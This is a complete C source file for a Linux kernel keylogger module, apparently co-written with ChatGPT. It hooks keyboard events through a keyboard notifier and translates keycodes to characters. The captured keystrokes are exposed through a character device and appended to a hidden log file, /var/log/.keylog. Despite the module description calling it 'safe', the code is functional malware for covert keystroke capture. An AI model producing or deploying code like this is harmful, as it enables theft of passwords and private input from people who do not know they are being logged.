#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>
#include <linux/wait.h>
#include <linux/fcntl.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define DEVICE_NAME "keylogger"
#define BUF_SIZE 1024
#define LOG_PATH "/var/log/.keylog"

static dev_t dev_num;
static struct cdev keylogger_cdev;
static struct class *keylogger_class;

static char keybuf[BUF_SIZE];
static int head = 0, tail = 0;
static DEFINE_SPINLOCK(buf_lock);
static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);

static struct work_struct keylogger_work;
static char pending_key;
static struct file *log_file;

static bool shift_pressed = false;
static bool caps_lock_active = false;

struct key_map {
    int keycode;
    char normal;
    char shifted;
};

static const struct key_map keymap[] = {
    {KEY_1, '1', '!'}, {KEY_2, '2', '@'}, {KEY_3, '3', '#'}, {KEY_4, '4', '$'},
    {KEY_5, '5', '%'}, {KEY_6, '6', '^'}, {KEY_7, '7', '&'}, {KEY_8, '8', '*'},
    {KEY_9, '9', '('}, {KEY_0, '0', ')'}, {KEY_MINUS, '-', '_'}, {KEY_EQUAL, '=', '+'},
    {KEY_TAB, '\t', '\t'}, {KEY_Q, 'q', 'Q'}, {KEY_W, 'w', 'W'}, {KEY_E, 'e', 'E'},
    {KEY_R, 'r', 'R'}, {KEY_T, 't', 'T'}, {KEY_Y, 'y', 'Y'}, {KEY_U, 'u', 'U'},
    {KEY_I, 'i', 'I'}, {KEY_O, 'o', 'O'}, {KEY_P, 'p', 'P'}, {KEY_LEFTBRACE, '[', '{'},
    {KEY_RIGHTBRACE, ']', '}'}, {KEY_ENTER, '\n', '\n'}, {KEY_A, 'a', 'A'}, {KEY_S, 's', 'S'},
    {KEY_D, 'd', 'D'}, {KEY_F, 'f', 'F'}, {KEY_G, 'g', 'G'}, {KEY_H, 'h', 'H'},
    {KEY_J, 'j', 'J'}, {KEY_K, 'k', 'K'}, {KEY_L, 'l', 'L'}, {KEY_SEMICOLON, ';', ':'},
    {KEY_APOSTROPHE, '\'', '"'}, {KEY_BACKSLASH, '\\', '|'}, {KEY_Z, 'z', 'Z'},
    {KEY_X, 'x', 'X'}, {KEY_C, 'c', 'C'}, {KEY_V, 'v', 'V'}, {KEY_B, 'b', 'B'},
    {KEY_N, 'n', 'N'}, {KEY_M, 'm', 'M'}, {KEY_COMMA, ',', '<'}, {KEY_DOT, '.', '>'},
    {KEY_SLASH, '/', '?'}, {KEY_SPACE, ' ', ' '},
    {0, 0, 0}
};

static char keycode_to_char(int keycode) {
    bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
    bool use_shifted = shift_pressed ^ (is_letter && caps_lock_active);

    for (int i = 0; keymap[i].keycode; i++) {
        if (keymap[i].keycode == keycode) {
            return use_shifted ? keymap[i].shifted : keymap[i].normal;
        }
    }
    return 0;
}

static void keylogger_work_func(struct work_struct *work) {
    unsigned long flags;
    char c = pending_key;

    if (c == 0) return;

    spin_lock_irqsave(&buf_lock, flags);
    keybuf[head] = c;
    head = (head + 1) % BUF_SIZE;
    if (head == tail)
        tail = (tail + 1) % BUF_SIZE;
    spin_unlock_irqrestore(&buf_lock, flags);

    wake_up_interruptible(&keylogger_wq);

    if (log_file) {
        loff_t pos = 0;
        printk(KERN_DEBUG "Writing to log: %c\n", c); // Debug log
        ssize_t written = kernel_write(log_file, &c, 1, &pos);
        if (written < 0) {
            printk(KERN_ERR "Failed to write to log file: %ld\n", written);
        }
    }
}

static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    printk(KERN_DEBUG "Notifier action: %lu, value: %d, down: %d\n", action, param->value, param->down); // Debug log

    // Xử lý KBD_KEYCODE thay vì KBD_KEYSYM
    if (action == KBD_KEYCODE) {
        if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
            shift_pressed = param->down;
            return NOTIFY_OK;
        }
        if (param->value == KEY_CAPSLOCK && param->down) {
            caps_lock_active = !caps_lock_active;
            return NOTIFY_OK;
        }
        if (param->down) {
            char c = keycode_to_char(param->value);
            if (c) {
                pending_key = c;
                schedule_work(&keylogger_work);
            }
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keylogger_notifier
};

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t len, loff_t *off) {
    int copied = 0;
    unsigned long flags;

    if (wait_event_interruptible(keylogger_wq, tail != head))
        return -ERESTARTSYS;

    spin_lock_irqsave(&buf_lock, flags);
    while (tail != head && copied < len) {
        if (put_user(keybuf[tail], buf + copied)) {
            spin_unlock_irqrestore(&buf_lock, flags);
            return -EFAULT;
        }
        tail = (tail + 1) % BUF_SIZE;
        copied++;
    }
    spin_unlock_irqrestore(&buf_lock, flags);

    return copied;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keylogger_read,
};

static int __init keylogger_init(void) {
    int ret;

    log_file = filp_open(LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_file)) {
        printk(KERN_ERR "Failed to open log file: %ld\n", PTR_ERR(log_file));
        log_file = NULL;
    } else if (log_file == NULL) {
        printk(KERN_ERR "Log file pointer is NULL\n");
    } else {
        printk(KERN_INFO "Log file opened successfully\n");
    }

    INIT_WORK(&keylogger_work, keylogger_work_func);
    spin_lock_init(&buf_lock);

    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        printk(KERN_ERR "Failed to allocate character device region: %d\n", ret);
        return ret;
    }

    cdev_init(&keylogger_cdev, &fops);
    ret = cdev_add(&keylogger_cdev, dev_num, 1);
    if (ret < 0) {
        printk(KERN_ERR "Failed to add character device: %d\n", ret);
        goto unregister;
    }

    keylogger_class = class_create(DEVICE_NAME);
    if (IS_ERR(keylogger_class)) {
        ret = PTR_ERR(keylogger_class);
        printk(KERN_ERR "Failed to create device class: %d\n", ret);
        goto del_cdev;
    }

    device_create(keylogger_class, NULL, dev_num, NULL, DEVICE_NAME);

    ret = register_keyboard_notifier(&nb);
    if (ret < 0) {
        printk(KERN_ERR "Failed to register keyboard notifier: %d\n", ret);
        goto destroy_device;
    }

    printk(KERN_INFO "Keylogger loaded (keyboard_notifier).\n");
    return 0;

destroy_device:
    device_destroy(keylogger_class, dev_num);
    class_destroy(keylogger_class);
del_cdev:
    cdev_del(&keylogger_cdev);
unregister:
    unregister_chrdev_region(dev_num, 1);
    return ret;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    flush_work(&keylogger_work);
    device_destroy(keylogger_class, dev_num);
    class_destroy(keylogger_class);
    cdev_del(&keylogger_cdev);
    unregister_chrdev_region(dev_num, 1);
    if (log_file) {
        filp_close(log_file, NULL);
        printk(KERN_INFO "Log file closed.\n");
    }
    printk(KERN_INFO "Keylogger unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("duckanh + ChatGPT");
MODULE_DESCRIPTION("Safe keylogger using keyboard_notifier + char device + log file");
